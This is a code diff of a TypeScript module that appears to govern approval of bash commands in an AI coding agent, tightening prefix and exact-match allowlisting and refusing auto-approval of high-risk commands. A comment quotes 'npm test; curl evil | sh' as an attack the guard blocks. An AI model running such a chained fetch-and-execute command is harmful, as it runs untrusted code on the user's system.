@@ -7,6 +7,8 @@
  * points outside the workspace or switches a command into "write a file / run a program" mode
  * still asks.
  */
+import type { RiskClass } from './risk.js';
+
 // Anything that can chain, substitute, redirect or group commands disqualifies a command from
 // prefix approval: "npm test; curl evil | sh" must never ride on an approved "npm test".
 const SHELL_META_RE = /[;&|`$<>(){}\\\n\r]/;
@@ -47,22 +49,59 @@ function leavesWorkspace(token: string): boolean {
   return /^(?:\/|~|[A-Za-z]:[\\/]|\\\\)/.test(value) || /(?:^|[\\/])\.\.(?:[\\/]|$)/.test(value);
 }
 
+/** Executable name without directory or Windows executable suffix (curl.exe → curl). */
+function commandName(token: string): string {
+  return (token.replace(/\\/g, '/').split('/').pop() ?? token)
+    .toLowerCase()
+    .replace(/\.(?:exe|cmd|bat|com)$/, '');
+}
+
 /**
- * The command prefix a user can approve once for the rest of the session ("npm test",
- * "npm run lint", "python -m pytest", "git status"). Undefined for compound or unusual commands,
- * which always need an explicit decision. File-mutating, network and package-install commands
- * return the whole command line, so only that exact command is remembered.
+ * Build the prefix that "always allow" may remember for a bash command. Launchers get a short
+ * prefix; interpreters and commands with risky options return undefined, meaning they always need
+ * a fresh decision. File-mutating, network and package-install commands return the whole command
+ * line, so only that exact command is remembered.
  */
 export function bashApprovalPrefix(input: unknown): string | undefined {
   const tokens = commandTokens(input);
-  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return undefined;
+  if (!tokens?.length || tokens[0].includes('=')) return undefined;
+  const name = commandName(tokens[0]);
+  if (ALWAYS_EXPLICIT.has(name)) return undefined;
   if (tokens.some(leavesWorkspace)) return undefined;
-  if (EXACT_ONLY.has(tokens[0]) || (PACKAGE_MANAGERS.has(tokens[0]) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''))) {
+  if (EXACT_ONLY.has(name) || (PACKAGE_MANAGERS.has(name) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''))) {
     return tokens.join(' ');
   }
   const take = tokens.length > 2 && LAUNCHER_SUBCOMMANDS.has(tokens[1]) ? 3 : tokens.length > 1 && !tokens[1].startsWith('-') ? 2 : 1;
-  if (take === 1 && INTERPRETERS.has(tokens[0])) return undefined;
+  if (take === 1 && INTERPRETERS.has(name)) return undefined;
   return tokens.slice(0, take).join(' ');
+}
+
+/**
+ * Auto mode never approves high or critical risk. Critical is denied earlier by the tool registry;
+ * this predicate is the single source of truth used by the CLI approval closure.
+ */
+export function canAutoApprove(mode: string, risk: RiskClass): boolean {
+  return mode === 'auto' && risk !== 'high' && risk !== 'critical';
+}
+
+/**
+ * An exact, session-scoped allowlist entry for one simple command. Restricted to plain commands
+ * (no quoting or shell metacharacters) so whitespace normalization can never widen the approved
+ * command into a different one.
+ */
+export function bashApprovalExact(input: unknown): string | undefined {
+  const command = input && typeof input === 'object' ? (input as { command?: unknown }).command : undefined;
+  if (typeof command !== 'string') return undefined;
+  const trimmed = command.trim();
+  if (!trimmed || SHELL_META_RE.test(trimmed) || /["']/.test(trimmed)) return undefined;
+  return trimmed.split(/\s+/).join(' ');
+}
+
+/** True when the command is byte-for-byte (after whitespace collapse) an approved exact command. */
+export function isApprovedBashExact(input: unknown, exactCommands: ReadonlySet<string>): boolean {
+  if (!exactCommands.size) return false;
+  const normalized = bashApprovalExact(input);
+  return normalized !== undefined && exactCommands.has(normalized);
 }
 
 /**
@@ -72,12 +111,14 @@ export function bashApprovalPrefix(input: unknown): string | undefined {
 export function isApprovedBashPrefix(input: unknown, prefixes: ReadonlySet<string>): boolean {
   if (!prefixes.size) return false;
   const tokens = commandTokens(input);
-  if (!tokens?.length || tokens[0].includes('=') || ALWAYS_EXPLICIT.has(tokens[0])) return false;
+  if (!tokens?.length || tokens[0].includes('=')) return false;
+  const name = commandName(tokens[0]);
+  if (ALWAYS_EXPLICIT.has(name)) return false;
   for (const prefix of prefixes) {
     const wanted = prefix.split(' ');
     if (wanted.length > tokens.length || !wanted.every((t, i) => tokens[i] === t)) continue;
     const extra = tokens.slice(wanted.length);
-    const exactOnly = EXACT_ONLY.has(tokens[0]) || (PACKAGE_MANAGERS.has(tokens[0]) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''));
+    const exactOnly = EXACT_ONLY.has(name) || (PACKAGE_MANAGERS.has(name) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''));
     if (exactOnly && extra.length) continue;
     if (extra.some(token => leavesWorkspace(token) || RISKY_OPTION_RE.test(token))) continue;
     return true;
